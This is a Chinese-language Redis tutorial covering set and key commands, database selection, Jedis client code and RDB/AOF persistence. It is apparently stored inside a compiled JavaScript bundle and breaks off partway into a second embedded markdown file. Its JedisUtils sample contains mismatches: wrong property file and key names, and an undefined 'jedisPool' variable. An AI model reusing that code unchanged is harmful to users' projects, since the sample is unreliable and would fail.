应用场景\n\n企业运营过程中，系统将产生出大量的运营数据，如何保障多台服务器操作日志的统一顺序输出？\n\n![](./img/sql/redis/第一章Redis基础/list应用.png)\n\n假如现在你有多台服务器，每一台服务器都会产生它的日志，假设你是一个运维人员，你想看它的操作日志，你怎么看呢？打开A机器的日志看一看，打开B机器的日志再看一看吗？这样的话你会可能会疯掉的！因为左边看的有可能它的时间是11:01，右边11:02，然后再看左边11:03，它们本身是连续的，但是你在看的时候就分成四个文件了，这个时候你看起来就会很麻烦。能不能把他们合并呢？答案是可以的！怎么做呢？建立起redis服务器。当他们需要记日志的时候，记在哪儿,全部发给redis。等到你想看的时候，通过服务器访问redis获取日志。然后得到以后，就会得到一个完整的日志信息。那么这里面就可以获取到完整的日志了，依靠什么来实现呢？就依靠我们的list的模型的顺序来实现。进来一组数据就往里加，谁先进来谁先加进去，它是有一定的顺序的。\n\n#### 2.10.2  解决方案\n\n依赖list的数据具有顺序的特征对信息进行管理\n\n使用队列模型解决多路信息汇总合并的问题\n\n使用栈模型解决最新消息的问题\n\n### 2.11  set 基本操作\n\n#### 2.11.1 set类型\n\n新的存储需求：存储大量的数据，在查询方面提供更高的效率\n\n需要的存储结构：能够保存大量的数据，高效的内部存储机制，便于查询\n\nset类型：与hash存储结构完全相同，仅存储键，不存储值（nil），并且值是不允许重复的\n\n![](./img/sql/redis/第一章Redis基础/set模型.png)\n\n通过这个名称，大家也基本上能够认识到和我们Java中的set完全一样。我们现在要存储大量的数据，并且要求提高它的查询效率。用list这种链表形式，它的查询效率是不高的，那怎么办呢？这时候我们就想，有没有高效的存储机制。其实前面咱讲Java的时候说过hash表的结构就非常的好，但是这里边我们已经有hash了，他做了这么一个设定，干嘛呢，他把hash的存储空间给改一下，右边你原来存数据改掉,全部存空，那你说数据放哪儿了？放到原来的filed的位置，也就在这里边存真正的值，那么这个模型就是我们的set 模型。\n\nset类型：与hash存储结构完全相同，仅存储键，不存储值（nil），并且值是不允许重复的。\n\n看一下它的整个结构：\n\n![](./img/sql/redis/第一章Redis基础/set4.png)\n\n#### 2.11.2 set类型数据的基本操作\n\n添加数据\n\n```bash\nsadd key member1 [member2]\n```\n\n获取全部数据\n\n```bash\nsmembers key\n```\n\n删除数据\n\n```bash\nsrem key member1 [member2]\n```\n\n获取集合数据总量\n\n```bash\nscard key\n```\n\n判断集合中是否包含指定数据\n\n```bash\nsismember key member\n```\n\n随机获取集合中指定数量的数据\n\n```bash\nsrandmember key [count]\n```\n\n随机获取集中的某个数据并将该数据移除集合\n\n```bash\nspop key [count]\n```\n\n### 2.12  set 类型数据的扩展操作\n\n#### 2.12.1  set 类型数据的扩展操作\n\n求两个集合的交、并、差集\n\n```\nsinter key1 [key2 …]  \nsunion key1 [key2 …]  \nsdiff key1 [key2 …]\n```\n\n求两个集合的交、并、差集并存储到指定集合中\n\n```\nsinterstore destination key1 [key2 …]  \nsunionstore destination key1 [key2 …]  \nsdiffstore destination key1 [key2 …]\n```\n\n将指定数据从原始集合中移动到目标集合中\n\n```\nsmove source destination member\n```\n\n通过下面一张图回忆一下交、并、差\n\n![](./img/sql/redis/第一章Redis基础/交并差.png)\n\n#### 2.12.2  set 类型数据操作的注意事项\n\nset 类型不允许数据重复，如果添加的数据在 set 中已经存在，将只保留一份。\n\nset 虽然与hash的存储结构相同，但是无法启用hash中存储值的空间。\n\n### 2.13  set应用场景\n\n#### 2.13.1  set应用场景\n\n（1）黑名单\n\n资讯类信息类网站追求高访问量，但是由于其信息的价值，往往容易被不法分子利用，通过爬虫技术，  快速获取信息，个别特种行业网站信息通过爬虫获取分析后，可以转换成商业机密进行出售。例如第三方火 车票、机票、酒店刷票代购软件，电商刷评论、刷好评。\n\n同时爬虫带来的伪流量也会给经营者带来错觉，产生错误的决策，有效避免网站被爬虫反复爬取成为每个网站都要考虑的基本问题。在基于技术层面区分出爬虫用户后，需要将此类用户进行有效的屏蔽，这就是黑名单的典型应用。\n\nps:不是说爬虫一定做摧毁性的工作，有些小型网站需要爬虫为其带来一些流量。\n\n（2）白名单\n\n对于安全性更高的应用访问，仅仅靠黑名单是不能解决安全问题的，此时需要设定可访问的用户群体， 依赖白名单做更为苛刻的访问验证。\n\n#### 2.13.2  解决方案\n\n基于经营战略设定问题用户发现、鉴别规则\n\n周期性更新满足规则的用户黑名单，加入set集合\n\n用户行为信息达到后与黑名单进行比对，确认行为去向\n\n黑名单过滤IP地址：应用于开放游客访问权限的信息源\n\n黑名单过滤设备信息：应用于限定访问设备的信息源\n\n黑名单过滤用户：应用于基于访问权限的信息源\n\n### 2.14  实践案例\n\n#### 2.14.1业务场景\n\n使用微信的过程中，当微信接收消息后，会默认将最近接收的消息置顶，当多个好友及关注的订阅号同时发 送消息时，该排序会不停的进行交替。同时还可以将重要的会话设置为置顶。一旦用户离线后，再次打开微信时，消息该按照什么样的顺序显示。\n\n我们分析一下：\n\n![](./img/sql/redis/第一章Redis基础/set案例.png)\n\n100这台手机代表你。而200、300、400这三台代表你好友的手机。在这里有一些东西需要交代一下，因为我们每个人的都会对自己的微信中的一些比较重要的人设置会话置顶，将他的那条对话放在最上面。我们假定这个人有两个会话置顶的好友，分别是400和500，而这里边就包含400.\n\n下面呢，我们就来发这个消息，第一个发消息的是300，他发了个消息给100。发完以后，这个东西应该怎么存储呢？在这里面一定要分开，记录置顶的这些人的会话，对应的会话显示顺序和非置顶的一定要分两。\n\n这里面我们创建两个模型，一个是普通的，一个是置顶的，而上面的这个置顶的用户呢，我们用set来存储，因为不重复。而下面这些因为有顺序，很容易想到用list去存储,不然你怎么表达顺序呢？\n\n![](./img/sql/redis/第一章Redis基础/300.png)\n\n那当300发给消息给100以后，这个时候我们先判定你在置顶人群中吗？不在,那好，300的消息对应的顺序就应该放在普通的列表里边。而在这里边，我们把300加进去。第一个数据也就是现在300。\n\n![](./img/sql/redis/第一章Redis基础/400.png)\n\n接下来400，发了个消息。判断一下，他是需要置顶的，所以400将进入list的置顶里边放着。当前还没有特殊的地方。\n\n![](./img/sql/redis/第一章Redis基础/200.png)\n\n再来200发消息了，和刚才的判定方法一样，先看在不在置顶里，不在的话进普通，然后在普通里边把200加入就行了，OK，到这里目前还没有顺序变化。\n\n接下来200又发消息过来，同一个人给你连发了两条，那这个时候200的消息到达以后，先判断是否在置顶范围，不在，接下来他要放在list普通中，这里你要注意一点，因为这里边已经有200，所以进来以后先干一件事儿，把200杀掉，没有200，然后再把200加进来，那你想一下，现在这个位置顺序是什么呢？就是新的都在右边，对不对？\n\n还记得我们说list模型，如果是一个双端队列，它是可以两头进两头出。当然我们双端从一头进一头出，这就是栈模型，现在咱们运用的就是list模型中的栈模型。\n\n![](./img/sql/redis/第一章Redis基础/3002.png)\n\n现在300发消息，先判定他在不在，不在，用普通的队列，接下来按照刚才的操作，不管你里边原来有没有300，我先把300杀掉，没了，200自然就填到300的位置了，他现在是list里面唯一一个，然后让300进来，注意是从右侧进来的，那么现在300就是最新的。\n\n![](./img/sql/redis/第一章Redis基础/分析.png)\n\n那么到这里呢，我们让100来读取消息。你觉得这个消息顺序应该是什么样的？首先置顶的400有一个，他跑在最上面，然后list普通如果出来的话，300是最新的消息，而200在他后面的。用这种形式，我们就可以做出来他的消息顺序来。\n\n#### 2.14.2  解决方案\n\n看一下最终的解决方案：\n\n依赖list的数据具有顺序的特征对消息进行管理，将list结构作为栈使用\n\n置顶与普通会话分别创建独立的list分别管理\n\n当某个list中接收到用户消息后，将消息发送方的id从list的一侧加入list（此处设定左侧）\n\n多个相同id发出的消息反复入栈会出现问题，在入栈之前无论是否具有当前id对应的消息，先删除对应id\n\n推送消息时先推送置顶会话list，再推送普通会话list，推送完成的list清除所有数据\n消息的数量，也就是微信用户对话数量采用计数器的思想另行记录，伴随list操作同步更新\n\n#### 2.14.3  数据类型总结\n\n总结一下，在整个数据类型的部分，我们主要介绍了哪些内容：\n\n首先我们了解了一下数据类型，接下来针对着我们要学习的数据类型，进行逐一讲解了string、hash、list、set等，最后通过一个案例总结了一下前面的数据类型的使用场景。\n\n## 3. 常用指令\n\n在这部分中呢，我们家学习两个知识，第一个是key的常用指令，第二个是数据库的常用指令。和前面我们学数据类型做一下区分，前面你学的那些指令呢，都是针对某一个数据类型操作的，现在学的都是对所有的操作的，来看一下，我们在学习Key的操作的时候，我们先想一下的操作我们应该学哪些东西:\n\n### 3.1  key 操作分析\n\n#### 3.1.1  key应该设计哪些操作？\n\nkey是一个字符串，通过key获取redis中保存的数据\n\n对于key自身状态的相关操作，例如：删除，判定存在，获取类型等\n\n对于key有效性控制相关操作，例如：有效期设定，判定是否有效，有效状态的切换等\n\n对于key快速查询操作，例如：按指定策略查询key\n\n#### 3.1.2  key 基本操作\n\n删除指定key\n\n```bash\ndel key\n```\n\n获取key是否存在\n\n```bash\nexists key\n```\n\n获取key的类型\n\n```bash\ntype key\n```\n\n3.1.3  拓展操作\n\n排序\n\n```bash\nsort\n```\n\n改名\n\n```bash\nrename key newkey\nrenamenx key newkey\n```\n\n#### 3.1.3  key 扩展操作（时效性控制）\n\n为指定key设置有效期\n\n```bash\nexpire key seconds\npexpire key milliseconds\nexpireat key timestamp\npexpireat key milliseconds-timestamp\n```\n\n获取key的有效时间\n\n```bash\nttl key\npttl key\n```\n\n切换key从时效性转换为永久性\n\n```bash\npersist key\n```\n\n#### 3.1.4  key 扩展操作（查询模式）\n\n查询key\n\n```bash\nkeys pattern\n```\n\n查询模式规则\n\n*匹配任意数量的任意符号      ?\t配合一个任意符号\t[]\t匹配一个指定符号\n\n```bash\nkeys *  keys    查询所有\nit*  keys       查询所有以it开头\n*heima          查询所有以heima结尾\nkeys ??heima    查询所有前面两个字符任意，后面以heima结尾 查询所有以\nkeys user:?     user:开头，最后一个字符任意\nkeys u[st]er:1  查询所有以u开头，以er:1结尾，中间包含一个字母，s或t\n```\n\n### 3.2  数据库指令\n\n#### 3.2.1  key 的重复问题\n\n在这个地方我们来讲一下数据库的常用指令，在讲这个东西之前，我们先思考一个问题：\n\n假如说你们十个人同时操作redis，会不会出现key名字命名冲突的问题。\n\n一定会，为什么?因为你的key是由程序而定义的。你想写什么写什么，那在使用的过程中大家都在不停的加，早晚有一天他会冲突的。\n\nredis在使用过程中，伴随着操作数据量的增加，会出现大量的数据以及对应的key。\n\n那这个问题我们要不要解决？要！怎么解决呢？我们最好把数据进行一个分类，除了命名规范我们做统一以外，如果还能把它分开，这样是不是冲突的机率就会小一些了，这就是咱们下面要说的解决方案！\n\n#### 3.2.2  解决方案\n\nredis为每个服务提供有16个数据库，编号从0到15\n\n每个数据库之间的数据相互独立\n\n![](./img/sql/redis/第一章Redis基础/数据库.png)\n\n在对应的数据库中划出一块区域，说他就是几，你就用几那块，同时，其他的这些都可以进行定义，一共是16个，这里边需要注意一点，他们这16个共用redis的内存。没有说谁大谁小，也就是说数字只是代表了一块儿区域，区域具体多大未知。这是数据库的一个分区的一个策略！\n\n#### 3.2.3   数据库的基本操作\n\n切换数据库\n\n```\nselect index\n```\n\n其他操作\n\n```\nping\n```\n\n#### 3.2.4  数据库扩展操作\n\n数据移动\n\n```\nmove key db\n```\n\n数据总量\n\n```\ndbsize\n```\n\n数据清除\n\n```\nflushdb  flushall\n```\n\n## 4. Jedis\n\n在学习完redis后，我们现在就要用Java来连接redis了，也就是我们的这一章要学的Jedis了。在这个部分，我们主要讲解以下3个内容：\n\nHelloWorld（Jedis版）\n\nJedis简易工具类开发\n\n可视化客户端\n\n### 4.1  Jedis简介\n\n#### 4.1.1  编程语言与redis\n\n![](./img/sql/redis/第一章Redis基础/jedis1.png)\n\n对于我们现在的数据来说，它是在我们的redis中，而最终我们是要做程序。那么程序就要和我们的redis进行连接。干什么事情呢？两件事：程序中有数据的时候，我们要把这些数据全部交给redis管理。同时，redis中的数据还能取出来，回到我们的应用程序中。那在这个过程中，在Java与redis之间打交道的这个东西就叫做Jedis.简单说，Jedis就是提供了Java与redis的连接服务的，里边有各种各样的API接口，你可以去调用它。\n\n除了Jedis外，还有没有其他的这种连接服务呢？其实还有很多，了解一下：\n\nJava语言连接redis服务 Jedis（SpringData、Redis 、 Lettuce）\n\n其它语言：C 、C++ 、C# 、Erlang、Lua 、Objective-C 、Perl 、PHP 、Python 、Ruby 、Scala\n\n#### 4.1.2  准备工作\n\n(1)jar包导入\n\n下载地址：https://mvnrepository.com/artifact/redis.clients/jedis\n\n基于maven\n\n```xml\n<dependency>\n<groupId>redis.clients</groupId>\n<artifactId>jedis</artifactId>\n<version>2.9.0</version>\n</dependency>\n```\n\n(2)客户端连接redis\n\n连接redis\n\n```\nJedis jedis = new Jedis("localhost", 6379);\n```\n\n操作redis\n\n```\njedis.set("name", "itheima");  jedis.get("name");\n```\n\n关闭redis连接\n\n```\njedis.close();\n```\n\nAPI文档\n\nhttp://xetorthio.github.io/jedis/\n\n#### 4.1.3 代码实现\n\n创建：com.itheima.JedisTest\n\n```java\npublic class JedisTest {\n\n    public static void main(String[] args) {\n        //1.获取连接对象\n        Jedis jedis = new Jedis("192.168.40.130",6379);\n        //2.执行操作\n        jedis.set("age","39");\n        String hello = jedis.get("hello");\n        System.out.println(hello);\n        jedis.lpush("list1","a","b","c","d");\n        List<String> list1 = jedis.lrange("list1", 0, -1);\n        for (String s:list1 ) {\n            System.out.println(s);\n        }\n        jedis.sadd("set1","abc","abc","def","poi","cba");\n        Long len = jedis.scard("set1");\n        System.out.println(len);\n        //3.关闭连接\n        jedis.close();\n    }\n}\n```\n\n\n\n### 4.2  Jedis简易工具类开发\n\n前面我们做的程序还是有点儿小问题，就是我们的Jedis对象的管理是我们自己创建的，真实企业开发中是不可能让你去new一个的，那接下来咱们就要做一个工具类，简单来说，就是做一个创建Jedis的这样的一个工具。\n\n#### 4.2.1  基于连接池获取连接\n\nJedisPool：Jedis提供的连接池技术 \n\npoolConfig:连接池配置对象 \n\nhost:redis服务地址\n\nport:redis服务端口号\n\n\n\nJedisPool的构造器如下：\n\n```java\npublic JedisPool(GenericObjectPoolConfig poolConfig, String host, int port) {\nthis(poolConfig, host, port, 2000, (String)null, 0, (String)null);\n}\n```\n\n#### 4.2.2  封装连接参数\n\n创建jedis的配置文件：jedis.properties\n\n```properties\njedis.host=192.168.40.130  \njedis.port=6379  \njedis.maxTotal=50  \njedis.maxIdle=10\n```\n\n#### 4.2.3  加载配置信息\n\n 创建JedisUtils：com.itheima.util.JedisUtils，使用静态代码块初始化资源\n\n```java\npublic class JedisUtils {\n    private static int maxTotal;\n    private static int maxIdel;\n    private static String host;\n    private static int port;\n    private static JedisPoolConfig jpc;\n    private static JedisPool jp;\n\n    static {\n        ResourceBundle bundle = ResourceBundle.getBundle("redis");\n        maxTotal = Integer.parseInt(bundle.getString("redis.maxTotal"));\n        maxIdel = Integer.parseInt(bundle.getString("redis.maxIdel"));\n        host = bundle.getString("redis.host");\n        port = Integer.parseInt(bundle.getString("redis.port"));\n        //Jedis连接池配置\n        jpc = new JedisPoolConfig();\n        jpc.setMaxTotal(maxTotal);\n        jpc.setMaxIdle(maxIdel);\n        jp = new JedisPool(jpc,host,port);\n    }\n\n}\n```\n\n#### 4.2.4  获取连接\n\n 对外访问接口，提供jedis连接对象，连接从连接池获取，在JedisUtils中添加一个获取jedis的方法：getJedis\n\n```java\npublic static Jedis getJedis(){\n\tJedis jedis = jedisPool.getResource();\n\treturn jedis;\n}\n```\n\n\n\n### 4.3  可视化客户端\n\n4.3.1  Redis Desktop Manager\n\n![](./img/sql/redis/第一章Redis基础/可视化.png)\n\n## 5. 持久化\n\n下面呢，进入到持久化的学习.这部分内容理解的东西多，操作的东西少。在这个部分，我们将讲解四个东西：\n\n持久化简介\n\nRDB\n\nAOF\n\nRDB与AOF区别\n\n### 5.1  持久化简介\n\n#### 5.1.1  场景-意外断电\n\n不知道大家有没有遇见过，就是正工作的时候停电了，如果你用的是笔记本电脑还好，你有电池，但如果你用的是台式机呢，那恐怕就比较灾难了，假如你现在正在写一个比较重要的文档，如果你要使用的是word，这种办公自动化软件的话，他一旦遇到停电，其实你不用担心，因为它会给你生成一些其他的文件。\n\n![](./img/sql/redis/第一章Redis基础/持久化案例1.png)\n\n其实他们都在做一件事儿，帮你自动恢复，有了这个文件，你前面的东西就不再丢了。那什么是自动恢复呢？你要先了解他的整个过程。\n\n我们说自动恢复，其实基于的一个前提就是他提前把你的数据给存起来了。你平常操作的所有信息都是在内存中的，而我们真正的信息是保存在硬盘中的，内存中的信息断电以后就消失了，硬盘中的信息断电以后还可以保留下来！\n\n![](./img/sql/redis/第一章Redis基础/备份.png)\n\n我们将文件由内存中保存到硬盘中的这个过程，我们叫做数据保存，也就叫做持久化。但是把它保存下来不是你的目的，最终你还要把它再读取出来，它加载到内存中这个过程，我们叫做数据恢复，这就是我们所说的word为什么断电以后还能够给你保留文件，因为它执行了一个自动备份的过程，也就是通过自动的形式，把你的数据存储起来，那么有了这种形式以后，我们的数据就可以由内存到硬盘上实现保存。\n\n#### 5.1.2  什么是持久化\n\n(1)什么是持久化\n\n利用永久性存储介质将数据进行保存，在特定的时间将保存的数据进行恢复的工作机制称为持久化 。\n\n持久化用于防止数据的意外丢失，确保数据安全性。\n\n(2)持久化过程保存什么？\n\n我们知道一点，计算机中的数据全部都是二进制，如果现在我要你给我保存一组数据的话，你有什么样的方式呢，其实最简单的就是现在长什么样，我就记下来就行了，那么这种是记录纯粹的数据，也叫做快照存储，也就是它保存的是某一时刻的数据状态。\n\n还有一种形式，它不记录你的数据，它记录你所有的操作过程，比如说大家用idea的时候，有没有遇到过写错了ctrl+z撤销，然后ctrl+y还能恢复，这个地方它也是在记录，但是记录的是你所有的操作过程，那我想问一下，操作过程，我都给你留下来了，你说数据还会丢吗？肯定不会丢，因为你所有的操作过程我都保存了。这种保存操作过程的存储，用专业术语来说可以说是日志，这是两种不同的保存数据的形式啊。\n\n![](./img/sql/redis/第一章Redis基础/持久化2.png)\n\n\n\n总结一下：\n\n第一种：将当前数据状态进行保存，快照形式，存储数据结果，存储格式简单，关注点在数据。\n\n第二种：将数据的操作过程进行保存，日志形式，存储操作过程，存储格式复杂，关注点在数据的操作过程。\n\n### 5.2  RDB\n\n#### 5.2.1  save指令\n\n手动执行一次保存操作\n\n```\nsave\n```\n\n**save指令相关配置**\n\n设置本地数据库文件名，默认值为 dump.rdb，通常设置为dump-端口号.rdb\n\n```\ndbfilename filename\n```\n\n设置存储.rdb文件的路径，通常设置成存储空间较大的目录中，目录名称data\n\n```\ndir path\n```\n\n设置存储至本地数据库时是否压缩数据，默认yes，设置为no，节省 CPU 运行时间，但存储文件变大\n\n```\nrdbcompression yes|no\n```\n\n设置读写文件过程是否进行RDB格式校验，默认yes，设置为no，节约读写10%时间消耗，单存在数据损坏的风险\n\n```\nrdbchecksum yes|no\n```\n\n**save指令工作原理**\n\n![](./img/sql/redis/第一章Redis基础/rdb启动方式.png)\n\n![](./img/sql/redis/第一章Redis基础/启动方式2.png)\n\n需要注意一个问题，来看一下，现在有四个客户端各自要执行一个指令，把这些指令发送到redis服务器后，他们执行有一个先后顺序问题，假定就是按照1234的顺序放过去的话，那会是什么样的？\n\n记得redis是个单线程的工作模式，它会创建一个任务队列，所有的命令都会进到这个队列里边，在这儿排队执行，执行完一个消失一个，当所有的命令都执行完了，OK，结果达到了。\n\n但是如果现在我们执行的时候save指令保存的数据量很大会是什么现象呢？\n\n他会非常耗时，以至于影响到它在执行的时候，后面的指令都要等，所以说这种模式是不友好的，这是save指令对应的一个问题，当cpu执行的时候会阻塞redis服务器，直到他执行完毕，所以说我们不建议大家在线上环境用save指令。\n\n#### 5.2.2  bgsave指令\n\n之前我们讲到了当save指令的数据量过大时，单线程执行方式造成效率过低，那应该如何处理？\n\n此时我们可以使用：**bgsave**指令，bg其实是background的意思，后台执行的意思\n\n手动启动后台保存操作，但不是立即执行\n\n```properties\nbgsave\n```\n\n**bgsave指令相关配置**\n\n后台存储过程中如果出现错误现象，是否停止保存操作，默认yes\n\n```properties\nstop-writes-on-bgsave-error yes|no\n```\n\n其 他\n\n```properties\ndbfilename filename  \ndir path  \nrdbcompression yes|no  \nrdbchecksum yes|no\n```\n\n**bgsave指令工作原理**\n\n![](./img/sql/redis/第一章Redis基础/rdb启动方式3.png)\n\n当执行bgsave的时候，客户端发出bgsave指令给到redis服务器。注意，这个时候服务器马上回一个结果告诉客户端后台已经开始了，与此同时它会创建一个子进程，使用Linux的fork函数创建一个子进程，让这个子进程去执行save相关的操作，此时我们可以想一下，我们主进程一直在处理指令，而子进程在执行后台的保存，它会不会干扰到主进程的执行吗？\n\n答案是不会，所以说他才是主流方案。子进程开始执行之后，它就会创建啊RDB文件把它存起来，操作完以后他会把这个结果返回，也就是说bgsave的过程分成两个过程，第一个是服务端拿到指令直接告诉客户端开始执行了；另外一个过程是一个子进程在完成后台的保存操作，操作完以后回一个消息。\n\n#### 5.2.3 save配置自动执行\n\n设置自动持久化的条件，满足限定时间范围内key的变化数量达到指定数量即进行持久化\n\n```properties\nsave second changes\n```\n\n参数\n\nsecond：监控时间范围\n\nchanges：监控key的变化量\n\n范例：\n\n```markdown\nsave 900 1\nsave 300 10\nsave 60 10000\n```\n\n其他相关配置：\n\n```markdown\ndbfilename filename\ndir path\nrdbcompression yes|no\nrdbchecksum yes|no\nstop-writes-on-bgsave-error yes|no\n```\n\n**save配置工作原理**\n\n![](./img/sql/redis/第一章Redis基础/启动方式4.png)\n\n#### 5.2.4 RDB三种启动方式对比\n\n| 方式           | save指令 | bgsave指令 |\n| -------------- | -------- | ---------- |\n| 读写           | 同步     | 异步       |\n| 阻塞客户端指令 | 是       | 否         |\n| 额外内存消耗   | 否       | 是         |\n| 启动新进程     | 否       | 是         |\n\n**RDB特殊启动形式**\n\n服务器运行过程中重启\n\n```bash\ndebug reload\n```\n\n关闭服务器时指定保存数据\n\n```bash\nshutdown save\n```\n\n全量复制（在主从复制中详细讲解）\n\n\n\n**RDB优点：**\n\n- RDB是一个紧凑压缩的二进制文件，存储效率较高\n- RDB内部存储的是redis在某个时间点的数据快照，非常适合用于数据备份，全量复制等场景\n- RDB恢复数据的速度要比AOF快很多\n- 应用：服务器中每X小时执行bgsave备份，并将RDB文件拷贝到远程机器中，用于灾难恢复。\n\n**RDB缺点**\n\n- RDB方式无论是执行指令还是利用配置，无法做到实时持久化，具有较大的可能性丢失数据\n- bgsave指令每次运行要执行fork操作创建子进程，要牺牲掉一些性能\n- Redis的众多版本中未进行RDB文件格式的版本统一，有可能出现各版本服务之间数据格式无法兼容现象\n\n\n\n### 5.3  AOF\n\n为什么要有AOF,这得从RDB的存储的弊端说起：\n\n- 存储数据量较大，效率较低，基于快照思想，每次读写都是全部数据，当数据量巨大时，效率非常低\n- 大数据量下的IO性能较低\n- 基于fork创建子进程，内存产生额外消耗\n- 宕机带来的数据丢失风险\n\n\n\n那解决的思路是什么呢？\n\n- 不写全数据，仅记录部分数据\n- 降低区分数据是否改变的难度，改记录数据为记录操作过程\n- 对所有操作均进行记录，排除丢失数据的风险\n\n#### 5.3.1 AOF概念\n\n**AOF**(append only file)持久化：以独立日志的方式记录每次写命令，重启时再重新执行AOF文件中命令 达到恢复数据的目的。**与RDB相比可以简单理解为由记录数据改为记录数据产生的变化**\n\nAOF的主要作用是解决了数据持久化的实时性，目前已经是Redis持久化的主流方式\n\n**AOF写数据过程**\n\n![](./img/sql/redis/第一章Redis基础/1.png)\n\n**启动AOF相关配置**\n\n开启AOF持久化功能，默认no，即不开启状态\n\n```properties\nappendonly yes|no\n```\n\nAOF持久化文件名，默认文件名为appendonly.aof，建议配置为appendonly-端口号.aof\n\n```properties\nappendfilename filename\n```\n\nAOF持久化文件保存路径，与RDB持久化文件保持一致即可\n\n```properties\ndir\n```\n\nAOF写数据策略，默认为everysec\n\n```properties\nappendfsync always|everysec|no\n```\n\n\n\n#### 5.3.2 AOF执行策略\n\nAOF写数据三种策略(appendfsync)\n\n- **always**(每次）：每次写入操作均同步到AOF文件中数据零误差，性能较低，不建议使用。\n\n\n- **everysec**（每秒）：每秒将缓冲区中的指令同步到AOF文件中，在系统突然宕机的情况下丢失1秒内的数据 数据准确性较高，性能较高，建议使用，也是默认配置\n\n\n- **no**（系统控制）：由操作系统控制每次同步到AOF文件的周期，整体过程不可控\n\n#### 5.3.3 AOF重写\n\n场景：AOF写数据遇到的问题，如果连续执行如下指令该如何处理\n\n![](./img/sql/redis/第一章Redis基础/2.png)\n\n**什么叫AOF重写？**\n\n随着命令不断写入AOF，文件会越来越大，为了解决这个问题，Redis引入了AOF重写机制压缩文件体积。AOF文件重 写是将Redis进程内的数据转化为写命令同步到新AOF文件的过程。简单说就是将对同一个数据的若干个条命令执行结 果转化成最终结果数据对应的指令进行记录。\n\n**AOF重写作用**\n\n- 降低磁盘占用量，提高磁盘利用率\n- 提高持久化效率，降低持久化写时间，提高IO性能\n- 降低数据恢复用时，提高数据恢复效率\n\n**AOF重写规则**\n\n- 进程内具有时效性的数据，并且数据已超时将不再写入文件\n\n\n- 非写入类的无效指令将被忽略，只保留最终数据的写入命令\n\n  如del key1、 hdel key2、srem key3、set key4 111、set key4 222等\n\n  如select指令虽然不更改数据，但是更改了数据的存储位置，此类命令同样需要记录\n\n- 对同一数据的多条写命令合并为一条命令\n\n如lpushlist1 a、lpush list1 b、lpush list1 c可以转化为：lpush list1 a b c。\n\n为防止数据量过大造成客户端缓冲区溢出，对list、set、hash、zset等类型，每条指令最多写入64个元素\n\n\n\n**AOF重写方式**\n\n- 手动重写\n\n```properties\nbgrewriteaof\n```\n\n**手动重写原理分析：**\n\n![](./img/sql/redis/第一章Redis基础/3.png)\n\n\n\n- 自动重写\n\n```properties\nauto-aof-rewrite-min-size size\nauto-aof-rewrite-percentage percentage\n```\n\n自动重写触发条件设置\n\n```properties\nauto-aof-rewrite-min-size size\nauto-aof-rewrite-percentage percent\n```\n\n自动重写触发比对参数（ 运行指令info Persistence获取具体信息 ）\n\n```properties\naof_current_size  \naof_base_size\n```\n\n 自动重写触发条件公式：\n\n![](./img/sql/redis/第一章Redis基础/4.png)\n\n\n\n\n\n#### 5.3.4 AOF工作流程及重写流程\n\n![](./img/sql/redis/第一章Redis基础/AOF工作流程.png)\n\n\n\n![](./img/sql/redis/第一章Redis基础/AOF流程2.png)\n\n\n\n![](./img/sql/redis/第一章Redis基础/AOF3.png)\n\n\n\n\n\n### 5.4  RDB与AOF区别\n\n#### 5.4.1 RDB与AOF对比（优缺点）\n\n| 持久化方式   | RDB                | AOF                |\n| ------------ | ------------------ | ------------------ |\n| 占用存储空间 | 小（数据级：压缩） | 大（指令级：重写） |\n| 存储速度     | 慢                 | 快                 |\n| 恢复速度     | 快                 | 慢                 |\n| 数据安全性   | 会丢失数据         | 依据策略决定       |\n| 资源消耗     | 高/重量级          | 低/轻量级          |\n| 启动优先级   | 低                 | 高                 |\n\n#### 5.4.2 RDB与AOF应用场景\n\nRDB与AOF的选择之惑\n\n- 对数据非常敏感，建议使用默认的AOF持久化方案\n\nAOF持久化策略使用everysecond，每秒钟fsync一次。该策略redis仍可以保持很好的处理性能，当出 现问题时，最多丢失0-1秒内的数据。\n\n注意：由于AOF文件存储体积较大，且恢复速度较慢\n\n- 数据呈现阶段有效性，建议使用RDB持久化方案\n\n数据可以良好的做到阶段内无丢失（该阶段是开发者或运维人员手工维护的），且恢复速度较快，阶段 点数据恢复通常采用RDB方案\n\n注意：利用RDB实现紧凑的数据持久化会使Redis降的很低，慎重总结：\n\n\n\n**综合比对**\n\n- RDB与AOF的选择实际上是在做一种权衡，每种都有利有弊\n- 如不能承受数分钟以内的数据丢失，对业务数据非常敏感，选用AOF\n- 如能承受数分钟以内的数据丢失，且追求大数据集的恢复速度，选用RDB\n- 灾难恢复选用RDB\n- 双保险策略，同时开启 RDB和 AOF，重启后，Redis优先使用 AOF 来恢复数据，降低丢失数据的量',En={data:function(){return{MainComponent:wn}}},Tn=En,kn=Object(u["a"])(Tn,_n,xn,!1,null,"866fbbd0",null),Cn=kn.exports,jn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Mn=[],Rn="\x3c!--\r\n * @Date           : 2020-11-05 21:36:01\r\n * @FilePath       : /jinnian-space/src/pages/sql/module/redis/md/redis.md\r\n * @Description    : \r\n--\x3e\r\n# redis\r\n\r\n## Redis\r\n\r\n### 启动Redis服务\r\n\r\n- redis-server（默认配置）\r\n- redis-server --configKey1 configValue1 --configKey2 configValue2（根据配置项启动）\r\n- redis-server /opt/redis/redis.conf（配置文件启动）\r\n\r\n### 连接Redis服务器\r\n\r\n- redis-cli -h {host} -p {port} (交互方式)\r\n- redis-cli -h {host} -p {port} {command}\t(命令方式)\r\n\r\n### 停止Redis服务\r\n\r\n- redis-cli shutdown nosave|save（断开与客户端连接、持久化文件生成）\r\n- kill -9 redis（强制杀死Redis服务）\r\n\r\n### 全局命令\r\n\r\n- keys * ：查看所有键\r\n- dbsize:  键总数\r\n- exists key: \t检查键是否存在\r\n- del key [key ...]:\t删除键\r\n- expire key seconds:\t设置键过期时间\r\n- ttl key:\t查看键剩余过期时间 \r\n- type key: 获取键的数据结构类型\r\n\r\n\t- string\r\n\t- list\r\n\t- set\r\n\t- zset\r\n\t- hash\r\n\r\n- object encoding key:\t查询键的内部编码\r\n\r\n### 字符串\r\n\r\n- set key value [ex seconds] [px milliseconds] [nx|xx]:\t设置值\r\n- get key:\t获取值\r\n- mset key value [key value ...]:\t批量设置值\r\n- mget key [key...]:\t\t批量获取值\r\n- incr key:\t值自增\r\n\r\n\t- 值不是整数，报错\r\n\t- 键不存在，默认为0，自增后返回1\r\n\t- 值是整数，返回自增后的结果\r\n\r\n- decr: 值自减\r\n- 